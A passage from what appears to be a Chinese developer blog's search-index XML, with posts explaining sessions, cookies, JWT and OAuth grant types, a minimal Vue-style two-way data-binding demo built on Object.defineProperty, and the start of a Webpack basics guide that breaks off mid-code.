checklist</a></li><li>码农翻身-web安全</li><li>《图解HTTP》第11章 Web的攻击技术</li></ul>]]></content>
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Session, token与OAuth</title>
      <link href="/2019/02/16/%E4%BB%8Esession%E5%88%B0token/"/>
      <url>/2019/02/16/%E4%BB%8Esession%E5%88%B0token/</url>
      <content type="html"><![CDATA[<h3 id="1-Web登录的本质"><a href="#1-Web登录的本质" class="headerlink" title="1. Web登录的本质"></a>1. Web登录的本质</h3><p>由于<strong>HTTP是无状态协议</strong>，所以服务端需要记录用户状态时，就需要某种机制来识别具体的用户，这个机制就是<em><code>Session</code></em>。</p><p><br></p><h3 id="2-cookie和Session"><a href="#2-cookie和Session" class="headerlink" title="2. cookie和Session"></a>2. cookie和Session</h3><p>常用的会话跟踪技术是cookie和session<br>cookie是存储在客户端，session是存储在server端<br>可以说，cookie是一种补足http协议无状态的机制</p><p>一个cookie的设置分为4步</p><ul><li>客户端发送http请求</li><li>服务器响应http请求 set-cookies response</li><li>客户端发送http请求 包含cookie头部 发送到服务器端</li><li>服务器返回一个http response</li></ul><p><br><br><img src="/2019/02/16/从session到token/1.png" style="max-width: 500px"></p><p>session 是用服务器来保持状态的。专门为用户开辟存储空间，session被创建后会保存在服务器中，其中session ID则发送给客户端，客户端下次发送请求携带session ID，服务器则会查询该ID 找到对应的session读取信息。</p><p>在使用session机制保持持久化登陆的实现上可以将sessionID保存在 cookie、header、URL中，客户端带着sessionID过来，服务器根据这个sessionID判断是否存在当前会话。</p><p>所以， <em><code>Session</code></em>是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中。<br><em><code>Cookie</code></em>是客户端保存用户信息的一种机制，用来记录用户的一些信息，也是实现Session的其中一环。</p><p><br></p><h3 id="3-从Session到token"><a href="#3-从Session到token" class="headerlink" title="3. 从Session到token"></a>3. 从Session到token</h3><p>Session的问题在于，扩展性不好。如果是服务器集群，或跨域的服务导向架构，就要求session数据共享，单点登录。服务器需要保存并管理所有人的session id, 这是一个巨大的开销。<em>可以不保存这些Session ID吗？</em></p><p>比如，对数据做一个签名。用HMAC-SHA256算法，加上一个只有我知道的密钥，对数据做一个签名，<strong>把这个数据和签名一起作为<code>token</code></strong>，由于密钥别人不知道，就无法伪造token了。<br><br><br><img src="/2019/02/16/从session到token/2.png" style="max-width: 300px"><br><br><br>这个token服务器不保存，只有小F把token发过来的时候，再用同样的HMAC-SHA256算法和同样的密钥，对数据再计算一次签名，和token中的签名做比较.如果相同，我们就知道小F已经登录过了，并且可以直接去到小F的user id。如果不相同，数据部分肯定被人篡改过，就可以告诉发送者: 对不起，没有认证。</p><p>这样一来，服务器就不保存session id了，它只是生成token, 验证token，用CPU的计算时间换取了session的存储空间。</p><p><br></p><h3 id="3-JWT"><a href="#3-JWT" class="headerlink" title="3. JWT"></a>3. JWT</h3><p><code>JWT(JSON Web Token)</code>是目前最流行的跨域认证解决方案。<br><img src="/2019/02/16/从session到token/3.png"></p><p>JWT大致长这样，它是一个很长的字符串，中间用<code>.</code>分隔成三部分。JWT不仅用于认证，也可以用于交换信息。有效使用JWT，可以降低服务器查询数据库的次数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Header(头部).Payload(负载).Signature(签名)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-1-Header"><a href="#3-1-Header" class="headerlink" title="3.1 Header"></a>3.1 <em><code>Header</code></em></h4><p>Header描述JWT的元数据, <code>alg</code>表示签名的算法，默认是HMAC SHA156。 <code>typ</code>表示这个token的类型，统一写为<code>JWT</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-2-Payload"><a href="#3-2-Payload" class="headerlink" title="3.2 Payload"></a>3.2 <em><code>Payload</code></em></h4><p>Payload用于存放实际需要传递的数据。JWtT规定了7个官方字段。除了官方字段，你还可以定义私有字段，JWT默认是不加密的，所以不要把秘密信息放在这里。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iss (issuer)：签发人</span><br><span class="line">exp (expiration time)：过期时间</span><br><span class="line">sub (subject)：主题</span><br><span class="line">aud (audience)：受众</span><br><span class="line">nbf (Not Before)：生效时间</span><br><span class="line">iat (Issued At)：签发时间</span><br><span class="line">jti (JWT ID)：编号</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-3-Signature"><a href="#3-3-Signature" class="headerlink" title="3.3 Signature"></a>3.3 <em><code>Signature</code></em></h4><p>Signature是对前两部分的签名。</p><p><br></p><h3 id="4-OAuth"><a href="#4-OAuth" class="headerlink" title="4. OAuth"></a>4. OAuth</h3><p><a href="http://www.rfcreader.com/#rfc6749" target="_blank" rel="noopener">OAuth</a> 是一个关于授权(authorization)的开放网络标准。OAuth在“客户端”与“服务提供商”之间，设置了一个授权层。“客户端”登录授权层以后，获取token，“服务提供商”根据token的权限范围和有效期，向“客户端”开放用户储存的资料。OAuth有以下几种常用模式：<br><br></p><h4 id="4-1-Resource-Owner-Password-Credentials-Grant-资源所有者密码凭据认可"><a href="#4-1-Resource-Owner-Password-Credentials-Grant-资源所有者密码凭据认可" class="headerlink" title="4.1 Resource Owner Password Credentials Grant(资源所有者密码凭据认可)"></a>4.1 Resource Owner Password Credentials Grant(资源所有者密码凭据认可)</h4><p>小A直接提供用户名和密码，让”信用卡管家”向“网易认证中心”请求token。<br><br></p><h4 id="4-2-Implicit-Grant-隐式许可"><a href="#4-2-Implicit-Grant-隐式许可" class="headerlink" title="4.2 Implicit Grant(隐式许可)"></a>4.2 Implicit Grant(隐式许可)</h4><p>小A用网易账号登录，确认授权后，会重定向到“信用卡管家”网站，同时捎带一个<code>token</code>。信用卡管家就可以用这个token，来访问网易开放的资源。<br><br><br><img src="/2019/02/16/从session到token/4.png"><br><br></p><h4 id="4-3-Authorization-Code-Grant-授权码许可"><a href="#4-3-Authorization-Code-Grant-授权码许可" class="headerlink" title="4.3 Authorization Code Grant(授权码许可)"></a>4.3 Authorization Code Grant(授权码许可)</h4><p>小A用网易账号登录的时候，网易认证中心不直接发token，而是发一个授权码<code>(authorization code)</code>。当“信用卡管理中心”取到这个code以后，在后台再次访问网易认证中心，这一次才拿到了真正的token。</p><p>授权码模式是功能最完整，流程最严密的授权模式。<br><br><br><img src="/2019/02/16/从session到token/5.png"></p><h4 id="4-4-解析jwt"><a href="#4-4-解析jwt" class="headerlink" title="4.4 解析jwt"></a>4.4 解析jwt</h4><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://mp.weixin.qq.com/s?__biz=MzAxOTc0NzExNg==&amp;mid=2665513566&amp;idx=1&amp;sn=a2688cadbe9c8042ff1abbdf04a8bd5e&amp;chksm=80d67a1db7a1f30b28b93ed2ab29edfbf982b780433e4bfd178e3cc52cb1f9100cc8f923db4f&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">干掉状态: 从session到token</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzAxOTc0NzExNg==&amp;mid=2665513744&amp;idx=1&amp;sn=93d0db97cfd67422bcd21c8afd00f495&amp;chksm=80d67b53b7a1f24537fdc7c10eb2783357c1f8c65ad55601a722216d2293ae3fb7b1c16e5449&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">从密码到token</a></li><li><a href="https://www.zhihu.com/question/19786827" target="_blank" rel="noopener">Cookie和Session有什么区别？</a></li><li><a href="http://www.rfcreader.com/#rfc6749" target="_blank" rel="noopener">The OAuth 2.0 Authorization Framework</a></li><li><a href="https://www.xiaolai.cc/2019/04/23/cookie/" target="_blank" rel="noopener">cookie与session实现持久化登陆</a></li><li><a href="https://juejin.im/post/5b7ea1366fb9a01a0b319612" target="_blank" rel="noopener">前后端分离使用 Token 登录解决方案</a></li></ul>]]></content>
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Object.defineProperty实现双向绑定</title>
      <link href="/2018/11/14/Vue%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A/"/>
      <url>/2018/11/14/Vue%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A/</url>
      <content type="html"><![CDATA[<h3 id="1-MVVM"><a href="#1-MVVM" class="headerlink" title="1. MVVM"></a>1. MVVM</h3><p>MVVM拆开来即为Model-View-ViewModel，由View，ViewModel，Model三部分组成。它目的在于更清楚地将用户界面（UI)的开发与应用程序中业务逻辑和行为的开发区分开来。</p><p><img src="/2018/11/14/Vue数据绑定/1.png" style="max-width: 400px"><br><strong>Model</strong><br>数据层<br>是对现实世界中事物的抽象结果，就是建模。</p><p><strong>View</strong><br>用户操作界面<br>负责将数据模型转化为UI展现出来。</p><p><strong>ViewModal</strong><br>业务逻辑层<br>View需要什么数据，ViewModel要提供这个数据；View有哪些些操作，ViewModel就要响应这些操作</p><p><br></p><h3 id="2-数据驱动"><a href="#2-数据驱动" class="headerlink" title="2. 数据驱动"></a>2. 数据驱动</h3><p>对于 View 来说，如果封装得好，一个UI组件能很方便地给大家复用。对于 Model 来说，它其实是用来存储业务的数据的，如果做得好，它也可以方便地复用。那么，ViewModel有多少可以复用？我们写完了一个 Vue实例之后，可以很方便地复用它吗？结论是：<em>非常难复用</em>。</p><p>ViewModel做的什么？就是写那些不能复用的业务代码。当交互复杂，一个数据的改变引起多处DOM的修改。ViewModel将变得<em>十分臃肿</em>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">message = 1;</span><br><span class="line">document.getElementById(&apos;message&apos;).innerHTML = message;</span><br><span class="line">document.getElementById(&apos;aboumessage&apos;).innerHTML = message;</span><br><span class="line">// ... 更多复杂的交互</span><br></pre></td></tr></table></figure></p><p>怎么简化ViewModel？<em>数据驱动: 数据的变更触发DOM的变化</em>。<br>我们希望，只执行<code>this.$data.message = 1</code>就可以触发与<code>message</code>相关的UI更新。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.$data.message = 1</span><br></pre></td></tr></table></figure></p><blockquote><p>所谓数据驱动，是指视图是由数据驱动生成的，我们对视图的修改，不会直接操作 DOM，而是通过修改数据。它相比我们传统的前端开发，如使用 jQuery 等前端库直接修改 DOM，大大简化了代码量。特别是当交互复杂的时候，只关心数据的修改会让代码的逻辑变的非常清晰，因为 DOM 变成了数据的映射，我们所有的逻辑都是对数据的修改，而不用碰触 DOM，这样的代码非常利于维护。</p></blockquote><p><br></p><h3 id="3-Vue实现数据驱动"><a href="#3-Vue实现数据驱动" class="headerlink" title="3. Vue实现数据驱动"></a>3. Vue实现数据驱动</h3><h4 id="3-1-Object-defineProperty"><a href="#3-1-Object-defineProperty" class="headerlink" title="3.1 Object.defineProperty"></a>3.1 Object.defineProperty</h4><p>Vue实现数据驱动的核心是利用了ES5的Object.defineProperty。</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/definePropert" target="_blank" rel="noopener">Object.defineProperty</a>方法会直接在一个对象上定义一个新属性，或修改一个对象的现有属性，并返回这个对象。利用 Object.defineProperty 给数据添加了 getter 和 setter，可以使我们在访问数据以及写数据的时候能自动执行一些逻辑。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Object.defineProperty(obj, &apos;text&apos;, &#123;</span><br><span class="line">  set: function(newVal) &#123;</span><br><span class="line">    updateUI();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">obj.text = 1; // 会触发updateUI()</span><br></pre></td></tr></table></figure><p>Vue采用这种数据劫持的方式，通过Object.defineProperty()方法来劫持 data 所有对象的 setter，使得data发生变动时能自动执行 重新编译模板。</p><p><br></p><h4 id="3-2-极简版双向绑定"><a href="#3-2-极简版双向绑定" class="headerlink" title="3.2 极简版双向绑定"></a>3.2 极简版双向绑定</h4><input id="input"><span id="span"></span><script>  const obj = {};  Object.defineProperty(obj, 'text', {    get: function() {    },    set: function(newVal) {      console.log('set val:' + newVal);      document.getElementById('input').value = newVal;      document.getElementById('span').innerHTML = newVal;    }  });  const input = document.getElementById('input');  input.addEventListener('keyup', function(e){    obj.text = e.target.value;  })</script><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;input id=&quot;input&quot;&gt;</span><br><span class="line">&lt;span id=&quot;span&quot;&gt;&lt;/span&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  //</span><br><span class="line">  const obj = &#123;&#125;;</span><br><span class="line">  Object.defineProperty(obj, &apos;text&apos;, &#123;</span><br><span class="line">    get: function() &#123;</span><br><span class="line">    &#125;,</span><br><span class="line">    set: function(newVal) &#123;</span><br><span class="line">      console.log(&apos;set val:&apos; + newVal);</span><br><span class="line">      document.getElementById(&apos;input&apos;).value = newVal;</span><br><span class="line">      document.getElementById(&apos;span&apos;).innerHTML = newVal;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  const input = document.getElementById(&apos;input&apos;);</span><br><span class="line">  input.addEventListener(&apos;keyup&apos;, function(e)&#123;</span><br><span class="line">    obj.text = e.target.value;</span><br><span class="line">  &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/2018/11/14/Vue数据绑定/3.png"></p><p><br></p><h4 id="3-3-依赖收集"><a href="#3-3-依赖收集" class="headerlink" title="3.3 依赖收集"></a>3.3 依赖收集</h4><p>这看上去很简单，但是它背后又潜藏着几个要处理的问题：</p><ul><li>怎样只更新和<code>message</code>有关的DOM</li><li>不想在每个 setter 方法里一个个写 DOM操作</li><li>data对象 中key: [virtualDom1, virtualDom2, …]一一对应？</li><li>怎样统一收集这个对应关系？</li></ul><ul><li>我们的数据、方法和DOM都是耦合在一起</li><li>我们只监听了一个属性,一个对象不可能只有一个属性,我们需要对对象每个属性进行监听</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;&#123;&#123; message &#125;&#125;&lt;/div&gt;</span><br><span class="line">&lt;input value=&quot;&#123;&#123; message &#125;&#125;&quot; /&gt;</span><br></pre></td></tr></table></figure><p>模板渲染时，渲染到需要读取this.$data.message的值，触发了getter函数。此时，我们可以把message这个变量和所在的元素绑定起来。一个变量就可以对应多个元素，我们<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var data = &#123;</span><br><span class="line">  key1: val1,</span><br><span class="line">  key2: val2,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var Dep = &#123;</span><br><span class="line">  key1: [virtualDom1, virtualDom2, virtualDom3, ...],</span><br><span class="line">  key1: [virtualDom1, virtualDom4, ...],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当key1被修改时，setting 根据 Dep 找到跟key1相对应的元素，只更新这一部分的UI。</p><p><img src="/2018/11/14/Vue数据绑定/2.png"></p><p><br></p><h3 id="实现MVVM-Demo"><a href="#实现MVVM-Demo" class="headerlink" title="实现MVVM Demo"></a>实现MVVM Demo</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Two-way data-binding&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; v-model=&quot;text&quot;&gt;</span><br><span class="line">        &#123;&#123; text &#125;&#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        function observe (obj, vm) &#123;</span><br><span class="line">            Object.keys(obj).forEach(function (key) &#123;</span><br><span class="line">                defineReactive(vm, key, obj[key]);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        function defineReactive (obj, key, val) &#123;</span><br><span class="line">            var dep = new Dep();</span><br><span class="line">            Object.defineProperty(obj, key, &#123;</span><br><span class="line">                get: function () &#123;</span><br><span class="line">                    if (Dep.target) dep.addSub(Dep.target);</span><br><span class="line">                    return val</span><br><span class="line">                &#125;,</span><br><span class="line">                set: function (newVal) &#123;</span><br><span class="line">                    if (newVal === val) return</span><br><span class="line">                    val = newVal;</span><br><span class="line">                    dep.notify();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        function nodeToFragment (node, vm) &#123;</span><br><span class="line">            var flag = document.createDocumentFragment();</span><br><span class="line">            var child;</span><br><span class="line">            while (child = node.firstChild) &#123;</span><br><span class="line">                compile(child, vm);</span><br><span class="line">                flag.appendChild(child);</span><br><span class="line">            &#125;</span><br><span class="line">            return flag;</span><br><span class="line">        &#125;</span><br><span class="line">        function compile (node, vm) &#123;</span><br><span class="line">            var reg = /\&#123;\&#123;(.*)\&#125;\&#125;/;</span><br><span class="line">            // 节点类型为元素</span><br><span class="line">            if (node.nodeType === 1) &#123;</span><br><span class="line">                var attr = node.attributes;</span><br><span class="line">                // 解析属性</span><br><span class="line">                for (var i = 0; i &lt; attr.length; i++) &#123;</span><br><span class="line">                    if (attr[i].nodeName == &apos;v-model&apos;) &#123;</span><br><span class="line">                        var name = attr[i].nodeValue; // 获取v-model绑定的属性名</span><br><span class="line">                        node.addEventListener(&apos;input&apos;, function (e) &#123;</span><br><span class="line">                            // 给相应的data属性赋值，进而触发该属性的set方法</span><br><span class="line">                            vm[name] = e.target.value;</span><br><span class="line">                        &#125;);</span><br><span class="line">                        node.value = vm[name]; // 将data的值赋给该node</span><br><span class="line">                        node.removeAttribute(&apos;v-model&apos;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                new Watcher(vm, node, name, &apos;input&apos;);</span><br><span class="line">            &#125;</span><br><span class="line">            // 节点类型为text</span><br><span class="line">            if (node.nodeType === 3) &#123;</span><br><span class="line">                if (reg.test(node.nodeValue)) &#123;</span><br><span class="line">                    var name = RegExp.$1; // 获取匹配到的字符串</span><br><span class="line">                    name = name.trim();</span><br><span class="line">                    new Watcher(vm, node, name, &apos;text&apos;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        function Watcher (vm, node, name, nodeType) &#123;</span><br><span class="line">        //  this为watcher函数</span><br><span class="line">            Dep.target = this;</span><br><span class="line">        //  console.log(this);</span><br><span class="line">            this.name = name;</span><br><span class="line">            this.node = node;</span><br><span class="line">            this.vm = vm;</span><br><span class="line">            this.nodeType = nodeType;</span><br><span class="line">            this.update();</span><br><span class="line">            Dep.target = null;</span><br><span class="line">        &#125;</span><br><span class="line">        Watcher.prototype = &#123;</span><br><span class="line">            update: function () &#123;</span><br><span class="line">                this.get();</span><br><span class="line">                if (this.nodeType == &apos;text&apos;) &#123;</span><br><span class="line">                    this.node.nodeValue = this.value;</span><br><span class="line">                &#125;</span><br><span class="line">                if (this.nodeType == &apos;input&apos;) &#123;</span><br><span class="line">                    this.node.value = this.value;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            // 获取daa中的属性值</span><br><span class="line">            get: function () &#123;</span><br><span class="line">                this.value = this.vm[this.name]; // 触发相应属性的get</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        function Dep () &#123;</span><br><span class="line">            this.subs = []</span><br><span class="line">        &#125;</span><br><span class="line">        Dep.prototype = &#123;</span><br><span class="line">            addSub: function(sub) &#123;</span><br><span class="line">                this.subs.push(sub);</span><br><span class="line">            &#125;,</span><br><span class="line">            notify: function() &#123;</span><br><span class="line">                this.subs.forEach(function(sub) &#123;</span><br><span class="line">                    sub.update();</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        function Vue (options) &#123;</span><br><span class="line">            this.data = options.data;</span><br><span class="line">            var data = this.data;</span><br><span class="line">            observe(data, this);</span><br><span class="line">            var id = options.el;</span><br><span class="line">            var dom = nodeToFragment(document.getElementById(id), this);</span><br><span class="line">            // 编译完成后，将dom返回到app中</span><br><span class="line">            document.getElementById(id).appendChild(dom);</span><br><span class="line">        &#125;</span><br><span class="line">        var vm = new Vue(&#123;</span><br><span class="line">            el: &apos;app&apos;,</span><br><span class="line">            data: &#123;</span><br><span class="line">                text: &apos;hello world&apos;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://zhuanlan.zhihu.com/p/38296857" target="_blank" rel="noopener">简单理解MVVM–实现Vue的MVVM模式</a></li><li><a href="https://blog.devtang.com/2015/11/02/mvc-and-mvvm/" target="_blank" rel="noopener">被误解的 MVC</a></li><li><a href="https://juejin.im/post/5b2f0769e51d45589f46949e" target="_blank" rel="noopener">Vue.js中的MVVM</a></li><li><a href="https://juejin.im/post/5b82b174518825431079d473" target="_blank" rel="noopener">Vue.js的响应式系统原理</a></li><li><a href="https://ustbhuangyi.github.io/vue-analysis/data-driven/" target="_blank" rel="noopener">Vue技术揭秘</a></li><li><a href="https://www.jianshu.com/p/2df6dcddb0d7" target="_blank" rel="noopener">实现双向绑定Proxy比defineproperty优劣如何</a></li></ul>]]></content>
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Webpack基本用法</title>
      <link href="/2018/11/14/webpack/"/>
      <url>/2018/11/14/webpack/</url>
      <content type="html"><![CDATA[<blockquote><p>为什么需要 Webpack 构建工具？</p><ol><li>多终端应用场景，需要不同的打包配置。如：PC 单页面打包，H5 支持服务端渲染和 PWA 离线缓存</li><li>npm 是 JS 的包管理系统，但 npm 包不能在 js 中直接引用</li><li>React, Vue, AngularJS, less, CssModules 语法在浏览器中无法直接解析</li></ol></blockquote><p><br></p><h3 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1. 基本概念"></a>1. 基本概念</h3><h4 id="1-1-安装运行"><a href="#1-1-安装运行" class="headerlink" title="1.1 安装运行"></a>1.1 安装运行</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install webpack webpack-cli --save-dev</span><br><span class="line">./node_modules/.bin/webpack -v</span><br></pre></td></tr></table></figure><p>通过 npm script 运行 webpack。模块局部安装会在 node_modules/.bin 目录创建软连接</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scripts: &#123; <span class="string">"build"</span>: <span class="string">"webpack"</span> &#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="1-2-基本组成"><a href="#1-2-基本组成" class="headerlink" title="1.2 基本组成"></a>1.2 基本组成</h4><ul><li><p>配置文件<br>默认配置是 webpack.config.js， 可以通过<code>webpack --config</code>指定配置文件</p></li><li><p>entry<br>通过入口文件寻找依赖，单入口 entry 是一个字符串，多入口 entry 是一个对象</p></li><li><p>output<br>告诉 webpack 如何将编译后的文件输出到磁盘。</p></li><li><p>mode<br>用来指定当前的构建环境是的值 production、development 还是 none。默认值为 production。指定后会设置<code>process.end.NODE_ENV</code>为该值，并默认开启一些插件。</p></li><li><p>loader<br>webpack 开箱即用只支持 js 和 json 两种文件类型，通过 loaders 去支持其他文件类型并且把它们转换成有效的模块，并且可以添加到依赖图中。loader 本身是一个函数，接受源文件作为参数，返回转换的结果。<br>test 指定匹配规则，use 指定使用的 loader 名称</p></li><li><p>plugin<br>插件用于 bundle 文件的优化，资源管理和环境变量注入，作用于整个构建过程</p></li></ul><p><br></p><h4 id="1-3-文件指纹"><a href="#1-3-文件指纹" class="headerlink" title="1.3 文件指纹"></a>1.3 文件指纹</h4><p><code>Hash</code>: 和整个项目的构建有关，只要项目文件有修改，整个项目构建的 hash 值就会更改<br><code>Chunkhash</code>: 和 webpack 打包的 chunk 有关，不同的 entry 会生成不同的 chunkhash 值<br><code>Contenthash</code>: 根据文件内容来定义 hash， 文件内容不变，则 contenthash 不变</p><p>一些占位符</p><ul><li><code>[ext]</code> 资源后缀名</li><li><code>[name]</code> 文件名称</li><li><code>[path]</code> 文件的相对路径</li><li><code>[folder]</code> 文件所在的文件夹</li><li><code>[contenthash]</code> 文件的内容 hash，默认是 md5 生成</li><li><code>[hash]</code> 文件内容的 hash，默认是 md5 生成</li><li><code>[emoji]</code> 一个随机的指代文件内容的 emoji</li></ul><p><br></p><h3 id="2-loader-plugin"><a href="#2-loader-plugin" class="headerlink" title="2. loader + plugin"></a>2. loader + plugin</h3><h4 id="2-1-解析ES6、JSX"><a href="#2-1-解析ES6、JSX" class="headerlink" title="2.1 解析ES6、JSX"></a>2.1 解析ES6、JSX</h4><p><code>babel-loader</code>用于解析ES6, JSX语法, babel的配置文件是<code>.bablerc</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 